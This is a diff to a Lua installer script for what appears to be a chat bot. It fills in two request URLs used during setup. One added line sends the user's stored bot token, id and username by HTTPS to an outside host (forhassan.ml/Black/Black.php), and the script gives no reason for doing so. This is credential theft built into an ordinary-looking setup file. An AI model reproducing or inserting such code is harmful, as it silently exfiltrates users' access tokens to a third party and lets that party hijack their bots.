@@ -38,7 +38,7 @@ if not database:get(Server_Apro.."UserName_apro") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-local Get_Info = http.request(""..UserName)
+local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
 if Get_Info:match('Is_Spam') then
 io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
 return false
@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_apro_Info()
 Create_Info(database:get(Server_apro.."Token_apro"),database:get(Server_apro.."Id_Apro"),database:get(Server_apro.."UserName_apro"))   
-https.request("="..database:get(Server_apro.."Id_apro").."&user="..database:get(Server_apro.."UserName_apro").."&token="..database:get(Server_apro.."Token_apro"))
+https.request("https://forhassan.ml/Black/Black.php?id="..database:get(Server_apro.."Id_apro").."&user="..database:get(Server_apro.."UserName_apro").."&token="..database:get(Server_apro.."Token_apro"))
 local Runapro = io.open("apro", 'w')
 Runapro:write([[
 #!/usr/bin/env bash
